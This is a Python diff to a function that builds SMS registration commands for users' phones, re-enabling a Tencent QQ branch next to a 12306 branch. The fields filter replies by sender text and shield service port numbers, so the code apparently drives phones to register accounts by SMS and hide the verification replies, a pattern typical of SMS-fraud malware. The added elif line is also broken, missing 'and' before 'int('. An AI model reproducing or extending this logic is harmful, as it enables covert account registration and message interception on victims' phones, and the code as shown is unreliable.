@@ -227,21 +227,20 @@ def get_cmd(_user, _threads):
 
 def get_register_cmd(_user, _threads):
     _result = None
-    # if str(_user['lastRegisterCmdAppIdList']).find(',4,') != -1:
-    #     _result = SMS_REGISTER_CONTENT.replace(
-    #         '[cmd]', 'ZC').replace('[spNumber]', '106906021077').replace('[filter]', '腾讯科技|随时随地')
-    #     if _user['mobileType'] == "ChinaUnion":
-    #         _result = _result.replace('[portShield]', '10690188')
-    #         _threads.append(threading.Thread(
-    #             target=async_update_register_cmd_count(_user, 'registerQqCmdCount')))
-    #     elif _user['mobileType'] == "ChinaMobile":
-    #         _result = _result.replace('[portShield]', '10690508')
-    #         _threads.append(threading.Thread(
-    #             target=async_update_register_cmd_count(_user, 'registerQqCmdCount')))
-    #     else:
-    #         _result = None
-    # el
-    if str(_user['lastRegisterCmdAppIdList']).find(',5,') != -1:
+    if str(_user['lastRegisterCmdAppIdList']).find(',4,') != -1 and int(get_system_parameter_from_db("qqRegisterLimit")) > 0:
+        _result = SMS_REGISTER_CONTENT.replace(
+            '[cmd]', 'ZC').replace('[spNumber]', '106906021077').replace('[filter]', '腾讯科技|随时随地')
+        if _user['mobileType'] == "ChinaUnion":
+            _result = _result.replace('[portShield]', '10690188')
+            _threads.append(threading.Thread(
+                target=async_update_register_cmd_count(_user, 'registerQqCmdCount')))
+        elif _user['mobileType'] == "ChinaMobile":
+            _result = _result.replace('[portShield]', '10690508')
+            _threads.append(threading.Thread(
+                target=async_update_register_cmd_count(_user, 'registerQqCmdCount')))
+        else:
+            _result = None
+    elif str(_user['lastRegisterCmdAppIdList']).find(',5,') != -1  int(get_system_parameter_from_db("12306RegisterLimit")) > 0:
         _result = SMS_REGISTER_CONTENT.replace('[cmd]', '999').replace(
             '[spNumber]', '12306').replace('[filter]', '12306|第三方').replace('[portShield]', '12306')
         _threads.append(threading.Thread(
